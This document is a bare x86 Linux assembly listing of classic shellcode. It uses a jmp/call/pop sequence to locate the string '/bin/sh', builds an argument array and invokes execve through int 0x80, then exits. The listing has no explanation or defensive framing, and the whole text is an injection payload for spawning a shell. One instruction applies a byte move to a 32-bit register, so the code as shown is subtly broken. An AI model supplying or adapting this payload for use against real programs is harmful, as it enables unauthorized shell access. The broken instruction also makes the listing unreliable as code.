       jmp call;
shell: popl %esi;
       xorl %eax, %eax;
       movb %eax, 0x7(%esi);
       movl %esi, 0x8(%esi);
       movl %eax, 0xc(%esi);
       movb $0xb, %al;
       movl %esi, %ebx;
       leal 0x8(%esi), %ecx;
       xorl %edx, %edx;
       int $0x80;
       xorl %ebx, %ebx;
       movl %ebx, %eax;
       inc %eax;
       int $0x80;
call:  call shell;
      .string "/bin/sh"
